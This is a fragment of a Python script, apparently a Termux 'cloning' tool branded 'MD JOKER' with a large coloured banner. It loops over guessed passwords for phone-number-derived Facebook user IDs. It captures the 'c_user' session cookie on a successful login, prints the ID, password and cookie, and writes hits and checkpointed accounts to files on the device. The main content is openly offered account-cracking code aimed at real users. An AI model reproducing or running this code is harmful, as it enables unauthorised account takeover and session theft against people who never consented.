...
\033[1;93m   MM MM        MM MMMMM.       MMmmMM      MMmmdM9   
\033[1;93m    MM MM.      ,MP MM  VMA      MM   Y  ,   MM  YM.   
\033[1;93m(O)  MM `Mb.    ,dP' MM   `MM.    MM     ,M   MM   `Mb. 
\033[1;93m Ymmm9    `"bmmd"' .JMML.   MMb..JMMmmmmMMM .JMML. .JMM.
 
 ╔═════════════════[\033[1;32m 𝗠𝗥 𝗦𝗛𝗔𝗛 𝗝𝗢𝗞𝗘𝗥\033[1;32m]══════════════╗
 \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m 𝐌𝐃 𝐉𝐎𝐊𝐄𝐑       \033[1;93m║
 \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m 𝐌𝐃 𝐉𝐎𝐊𝐄𝐑 𝐊𝐇𝐀𝐍𝐎𝐎       \033[1;93m║
 \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35m𝐊𝐡𝐀𝐧𝐨𝐨_𝐉𝐨𝐤𝐞𝐑         \033[1;93m ║
 \033[1;93m║     \033[1;36m[✓] TOOL STATUS  : \033[1;36m 𝐦𝐫 𝐣𝐨𝐤𝐞𝐫 𝐤𝐡𝐚𝐧𝐨𝐨       \033[1;93m ║
 ...
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m 𝐉𝐎𝐊𝐄𝐑 TERMUX COMMEND AWCC....           \033[1;93m ║
 ╚═════════════════[\033[1;32m 𝐌𝐃_𝐉𝐎𝐊𝐄𝐑 \033[1;32m]══════════════════╝""")
loop = 0
oks = []
cps = []
def clear():
...
def xxr():
    ...
    os.system("clear")
    print(logo)
    print(f' [{xr}^{x}] Example>: {xr}079,077,078,93702,93701,93778{x}')
    print(" ══════════════════════════════════════════")
    rk1 = '0701'
    rk2 = '0702'
    rk3 = '0705'
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[𝐌𝐃_𝐉𝐎𝐊𝐄𝐑-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/𝐌𝐃_𝐉𝐎𝐊𝐄𝐑-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/𝐌𝐃_𝐉𝐎𝐊𝐄𝐑-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}𝐌𝐃_𝐉𝐎𝐊𝐄𝐑{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
